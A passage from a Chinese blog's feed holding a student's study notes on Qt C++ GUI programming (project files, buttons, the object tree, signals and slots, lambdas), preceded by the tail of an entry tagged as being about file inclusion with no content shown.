&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;h2 id=&quot;0x01定义&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="文件包含" scheme="https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>大二程序设计综合实践</title>
    <link href="https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/"/>
    <id>https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-07T06:32:17.000Z</published>
    <updated>2020-12-14T00:41:59.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序设计综合实践"><a href="#程序设计综合实践" class="headerlink" title="程序设计综合实践"></a>程序设计综合实践</h1><p>图形化编程</p><p>这不同语言分数还不太一样，最后用Qt了</p><p>四个星期四个实验，应该问题不大</p><p>趁下次比赛之前把这个实验弄完</p><p>先贴链接</p><p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p><p>下面尽量用代码和注释介绍基础知识，写得有点乱，可以看b站去学</p><p>主要是自己记录一下知识</p><p>我用的是5.14的 b站应该是5.5的 有些知识会有点出入</p><h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-创建qt项目"><a href="#0x01-创建qt项目" class="headerlink" title="0x01 创建qt项目"></a>0x01 创建qt项目</h2><p>安装完成后</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p><p>可以先看一下上面这个内容</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 模块"></p><h3 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1.新建项目"></a>1.新建项目</h3><p>选第一个</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p><p>一直默认，直到选类名<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p><p>之后一直默认就可以了</p><p>最终界面如图</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p><h3 id="2-pro文件"><a href="#2-pro文件" class="headerlink" title="2. .pro文件"></a>2. .pro文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//包含的模块</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//大于Qt4版本 才包含widget模块</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//应用程序名  生成的.exe程序名称</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//模板类型    应用程序模板</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//源文件</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//头文件</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><em>\</em>.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**</strong>。</p></blockquote><h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a 应用程序对象 在Qt中 有且仅有一个</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//窗口对象 MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//必须要show方法才可以展示</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>Qt系统提供的标准类名声明头文件没有.h后缀</li><li>Qt一个类对应一个头文件，类名就是头文件名</li><li>QApplication应用程序类</li><li><ol><li>管理图形用户界面应用程序的控制流和主要设置。</li><li>是Qt的整个后台管理的命脉它<strong>包含主事件循环**</strong>，在其中来自窗口系统和其它资源的<strong>*所有事件处理和调度。它也处理应用程序的初始化和结束</strong>，并且<strong>提供对话管理</strong>。</li><li>对于任何一个使用Qt的图形用户界面应用程序，都正好存在一个QApplication 对象，而不论这个应用程序在同一时间内是不是有0、1、2或更多个窗口。</li></ol></li><li><p>a.exec()</p></li></ul><p>程序进入消息循环，等待对用户输入进行响应。这里main()把控制权转交给Qt，Qt完成事件处理工作，当应用程序退出的时候exec()的值就会返回。<strong>在exec()中，Qt接受并处理用户和系统的事件并且把它们传递给适当的窗口部件。</strong></p><h3 id="4-快捷键及命名规范"><a href="#4-快捷键及命名规范" class="headerlink" title="4.快捷键及命名规范"></a>4.快捷键及命名规范</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命名规范 </span></span><br><span class="line"><span class="comment">//类名 首字母大写，单词和单词之间首字母大写</span></span><br><span class="line"><span class="comment">//函数名 首字母小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / 注释</span></span><br><span class="line"><span class="comment">//ctrl + r 运行</span></span><br><span class="line"><span class="comment">//ctrl + b 编译</span></span><br><span class="line"><span class="comment">//f1 帮助文档</span></span><br><span class="line"><span class="comment">//ctrl + shift + 上 上移</span></span><br><span class="line"><span class="comment">//ctrl + i 对齐</span></span><br><span class="line"><span class="comment">//f4 切换.cpp 和 .h</span></span><br></pre></td></tr></table></figure><h2 id="0x02-新建Qt程序"><a href="#0x02-新建Qt程序" class="headerlink" title="0x02 新建Qt程序"></a>0x02 新建Qt程序</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>创建按钮</p><p>把下面这段代码复制到widget.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//按钮操作</span></span><br><span class="line">  <span class="comment">//创建第一个按钮</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//show以顶层方式弹出控件</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//设置父亲</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//显示文本</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"第一个"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//此外还有第二种方法进行操作</span></span><br><span class="line">    <span class="comment">//创建第二个按钮</span></span><br><span class="line">    <span class="comment">//按照控件大小创建窗口</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"第二个"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//移动btn2按钮</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//重置按钮大小</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//窗口操作</span></span><br><span class="line">    <span class="comment">//重置窗口大小</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//设置固定窗口大小</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//设置窗口标题</span></span><br><span class="line">    setWindowTitle(<span class="string">"计算器"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p><h3 id="2-对象树"><a href="#2-对象树" class="headerlink" title="2.对象树"></a>2.对象树</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p><p>自己创建一个MyPushButton</p><p>同时继承QPushButton</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p><p>代码如下</p><p><code>mypushbutton.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造调用"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造析构"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mypushbutton.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure><p><code>widget.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建自己按钮对象</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>图示如下</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p><h2 id="0x03-信号和槽的机制"><a href="#0x03-信号和槽的机制" class="headerlink" title="0x03 信号和槽的机制"></a>0x03 信号和槽的机制</h2><h3 id="1-信号和槽"><a href="#1-信号和槽" class="headerlink" title="1.信号和槽"></a>1.信号和槽</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qt信号和槽 "></p><p>基本的接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;给我的按钮一个关闭窗口的功能</span><br><span class="line">&#x2F;&#x2F;参数1 信号发送者 参数2 发送的信号(函数地址) 参数3 信号接收者 参数4 处理的槽函数</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure><h4 id="自定义信号和槽"><a href="#自定义信号和槽" class="headerlink" title="自定义信号和槽"></a><strong>自定义信号和槽</strong></h4><p>自定义信号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.h文件下</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//自定义信号 写在signals下</span></span><br><span class="line">    <span class="comment">//返回值是void 只需要声明 不需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>自定义槽</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.文件public中</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//返回值是void 需要声明 需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现在类的.cpp中实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来进行一个<strong>小的案例</strong></p><blockquote><p>一个按钮响起之后 程序输出接受成功</p></blockquote><p>我们首先得有两个类</p><ol><li>button</li><li>recv</li></ol><p>然后得有<strong>信号 槽函数 定义槽函数 </strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是连接,这里我们<strong>需要注意只有rang之后才会接受</strong></p><p>所以就需要rang起来，<strong>这里用的plz函数让它rang</strong></p><p>其中的一些成员名需要在<code>widget.h</code>中是实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-重载信号和槽"><a href="#2-重载信号和槽" class="headerlink" title="2.重载信号和槽"></a>2.重载信号和槽</h3><p>接着上个案例</p><p><strong>重载信号 重载槽 重新定义槽函数</strong> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功响铃"</span> &lt;&lt; second &lt;&lt; <span class="string">"秒"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于连接无法分清函数地址，这里用<strong>函数指针来体现函数地址</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单说一下函数指针</span></span><br><span class="line"><span class="comment">//返回类型为空 第一个括号里为指针 第二个括号为参数 =后面是需要指向函数的地址</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure><p>成功实现</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p><blockquote><p>Qstring怎么去掉引号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-信号和槽的拓展"><a href="#3-信号和槽的拓展" class="headerlink" title="3.信号和槽的拓展"></a>3.信号和槽的拓展</h3><ul><li>信号可以连接信号</li><li>一个信号可以连接多个槽函数</li><li>多个信号可以连接同一个槽函数</li><li><strong>信号和槽函数的类型必须一一对应</strong></li><li>信号的参数个数可以大于槽函数的参数个数</li></ul><h4 id="信号连接信号"><a href="#信号连接信号" class="headerlink" title="信号连接信号"></a>信号连接信号</h4><p>继续下一个</p><p><strong>我们按下按钮1才会响铃</strong></p><p>这里用两种实现</p><ol><li>点击连接plz函数</li><li><strong>点击连接响铃信号</strong>,此时函数中无参数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure><p>效果图如下</p><p>方法1</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p><p>方法2</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p><h3 id="4-Lambda表达式"><a href="#4-Lambda表达式" class="headerlink" title="4.Lambda表达式"></a>4.Lambda表达式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">btn1-&gt;setText(<span class="string">"第二个"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()调用</span></span><br><span class="line"><span class="comment">//[]必须存在 不可省略</span></span><br><span class="line"><span class="comment">//()重载函数的参数</span></span><br><span class="line"><span class="comment">//= 值传递</span></span><br><span class="line"><span class="comment">//&amp; 引用传递</span></span><br><span class="line"><span class="comment">//a 只对a传递</span></span><br><span class="line"><span class="comment">//&amp;a 只对引用a传递</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对于想要值修改，需要mutable关键字,但不改变本体</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//返回值 -&gt;返回值类型</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure><h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 